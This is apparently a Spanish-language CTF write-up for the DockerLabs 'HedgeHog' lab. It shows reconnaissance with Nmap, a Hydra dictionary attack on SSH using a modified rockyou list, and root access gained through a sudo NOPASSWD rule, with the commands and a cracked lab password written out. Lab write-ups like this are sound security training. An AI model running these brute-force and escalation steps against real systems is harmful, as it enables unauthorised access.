# DockerLabs — Writeup: HedgeHog (Muy Fácil)

> Laboratorio/CTF autorizado de DockerLabs. Este writeup documenta únicamente la resolución de la máquina **HedgeHog**, catalogada como **Muy Fácil**.

Esta máquina presenta una cadena sencilla orientada a practicar fundamentos:

- Reconocimiento y enumeración de servicios con Nmap.
- Enumeración web básica para obtener un nombre de usuario válido.
- Preparación y manipulación básica de una wordlist.
- Ataque de diccionario contra SSH dentro de un entorno CTF.
- Acceso inicial mediante credenciales válidas.
- Enumeración de privilegios con `sudo -l`.
- Movimiento de usuario mediante una regla `NOPASSWD` insegura.
- Escalada final a `root`.

---

## 1. Reconocimiento inicial

Lo primero que hacemos es comprobar que la máquina está activa en nuestra red.

```bash
ping -c 1 172.17.0.2
```

<img width="567" height="147" alt="Captura de pantalla 2026-10-01 140218" src="https://github.com/user-attachments/assets/5fa4018e-feb2-4f7d-9472-b392aacca4c6" />


### Explicación para principiantes

La respuesta ICMP nos devuelve, entre otros datos, un valor **TTL** (Time To Live). En este caso observamos un TTL de **64**, valor habitual en sistemas Linux/Unix.

A continuación realizamos un escaneo de puertos con Nmap para identificar puertos abiertos, servicios y posibles versiones.

```bash
nmap -sS -sCV -Pn -n 172.17.0.2
```

<img width="790" height="310" alt="Captura de pantalla 2026-10-01 140306" src="https://github.com/user-attachments/assets/fdf00d43-a7db-48bd-b00c-53a7f3a59427" />


El resultado muestra dos puertos abiertos:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.58 (Ubuntu) |

La web no tiene título (`Site doesn't have a title`), lo que nos obliga a revisarla manualmente en el navegador.

---

## 2. Enumeración web: obtención del usuario

Visitamos directamente la raíz del servicio web:

```
http://172.17.0.2
```

<img width="1096" height="279" alt="Captura de pantalla 2026-10-01 140334" src="https://github.com/user-attachments/assets/4256fd95-fd99-4115-9d85-ab8dc0f580f9" />


La página está prácticamente en blanco, pero contiene un texto suelto con el valor **`tails`**. Esto nos da el nombre de usuario que utilizaremos más adelante para el ataque contra SSH, evitándonos tener que adivinarlo o enumerarlo por otra vía.

---

## 3. Preparación de la wordlist

Comenzamos copiando la wordlist `rockyou.txt` al directorio de trabajo:

```bash
cp /usr/share/wordlists/rockyou.txt .
```

<img width="371" height="52" alt="Captura de pantalla 2026-10-01 140838" src="https://github.com/user-attachments/assets/0b49c461-e8c7-486a-ab7d-3b1f2559198d" />

A continuación invertimos el orden de sus líneas y guardamos el resultado en `backpass.txt`:

```bash
tac rockyou.txt >> backpass.txt
```

<img width="350" height="49" alt="Captura de pantalla 2026-10-01 140843" src="https://github.com/user-attachments/assets/a15d3bfd-5daf-419a-ac18-7abb1ab2b7c8" />

Finalmente eliminamos los espacios presentes en el archivo:

```bash
sed -i 's/ //g' backpass.txt
```

<img width="323" height="48" alt="Captura de pantalla 2026-10-01 140848" src="https://github.com/user-attachments/assets/c25d5834-3caf-4e93-a998-e74b07b5c666" />


El objetivo de estos pasos es preparar la lista que utilizaremos durante la auditoría de la contraseña del usuario `tails`.

> **Nota:** `tac` invierte el orden de las líneas del archivo; no invierte los caracteres de cada contraseña.

---

## 4. Auditoría de credenciales SSH

Utilizamos Hydra contra el servicio SSH del objetivo, indicando el usuario `tails` (obtenido en la enumeración web) y la wordlist preparada anteriormente:

```bash
hydra -l tails -P /home/kali/backpass.txt ssh://172.17.0.2
```

<img width="1017" height="204" alt="Captura de pantalla 2026-10-01 140955" src="https://github.com/user-attachments/assets/3dd5e31d-c165-468b-a24f-dd2138130c8f" />


Hydra encuentra una credencial válida:

```text
login: tails
password: 3117548331
```

---

## 5. Acceso inicial mediante SSH

Nos conectamos al objetivo utilizando las credenciales encontradas:

```bash
ssh tails@172.17.0.2
```

<img width="660" height="331" alt="Captura de pantalla 2026-10-01 141031" src="https://github.com/user-attachments/assets/bd7f9356-288f-4064-a609-a6f12b3c78dc" />


Tras aceptar la fingerprint del host e introducir la contraseña obtenemos una shell como el usuario `tails`. Con esto conseguimos nuestro acceso inicial al sistema.

---

## 6. Enumeración de privilegios con sudo

Una vez dentro revisamos los privilegios sudo disponibles:

```bash
sudo -l
```

<img width="536" height="234" alt="Captura de pantalla 2026-10-01 141147" src="https://github.com/user-attachments/assets/f3a9cd0c-fb17-4b86-bab2-5ea37e40b7a8" />


El resultado muestra una configuración especialmente insegura:

```text
User tails may run the following commands on bac04e2e30e6:
    (sonic) NOPASSWD: ALL
```

Esto significa que `tails` puede ejecutar cualquier comando como el usuario `sonic` sin necesidad de contraseña.

Al revisar los directorios personales del sistema:

```bash
cd ..
ls
```

aparecen:

```text
sonic  tails  ubuntu
```

Un intento de entrar directamente al directorio de `sonic` falla (`Permission denied`), y probar `su sonic` también falla por no conocer su contraseña. Esto confirma que el único camino disponible es aprovechar el privilegio sudo concedido.

---

## 7. Movimiento al usuario sonic

Aprovechamos la regla `NOPASSWD` para iniciar una shell como `sonic`:

```bash
sudo -u sonic /bin/bash
whoami
```

Resultado:

```text
sonic
```

En este punto hemos pasado de `tails` a `sonic` aprovechando exclusivamente una mala configuración de sudo.

---

## 8. Escalada final a root

Desde la sesión de `sonic` ejecutamos:

```bash
sudo -u root /bin/bash
whoami
```

<img width="461" height="63" alt="Captura de pantalla 2026-10-01 141243" src="https://github.com/user-attachments/assets/b6e23e2d-0ce9-4249-afff-a909c1182e45" />


El prompt cambia a una shell de `root`, completando la escalada de privilegios.

---

## 9. Resumen de la cadena de ataque

```text
Reconocimiento
      ↓
Ping + Nmap (puertos 22 y 80)
      ↓
Enumeración web → usuario "tails" filtrado en la página
      ↓
Preparación de wordlist (rockyou + tac + sed)
      ↓
Hydra contra SSH
      ↓
Credenciales de tails
      ↓
SSH como tails
      ↓
sudo -l
      ↓
(sonic) NOPASSWD: ALL
      ↓
sudo -u sonic /bin/bash
      ↓
Usuario sonic
      ↓
sudo -u root /bin/bash
      ↓
ROOT
```

---

## 10. Debilidades observadas

| Debilidad / mala configuración | Impacto |
|---|---|
| Nombre de usuario expuesto en la página web | Facilita dirigir el ataque de diccionario a una cuenta concreta |
| Contraseña SSH presente en una wordlist conocida | Permite obtener acceso mediante un ataque de diccionario dentro del laboratorio |
| Regla sudo `(sonic) NOPASSWD: ALL` para `tails` | Permite ejecutar cualquier comando como `sonic` sin contraseña |
| Cadena de privilegios sudo excesivamente permisiva | Permite terminar alcanzando una shell de `root` |

---

## 11. Conclusión

**HedgeHog** es una máquina intencionadamente básica. Su valor no está en representar por completo un entorno moderno de producción, sino en permitir practicar de forma aislada varios conceptos fundamentales: reconocimiento con Nmap, enumeración web, auditoría de contraseñas, acceso SSH, lectura de reglas sudo y abuso de permisos `NOPASSWD`.

En sistemas actuales bien configurados, un ataque de diccionario masivo contra SSH puede verse limitado por controles como autenticación por clave, MFA, políticas de contraseña, rate limiting, bloqueos o sistemas de detección. Precisamente por eso este tipo de laboratorio debe entenderse como una práctica controlada de fundamentos y no como una representación exacta de una infraestructura moderna.

La lección principal de la máquina es sencilla:

```text
Usuario filtrado + credenciales débiles + permisos sudo excesivos = compromiso completo del sistema
```
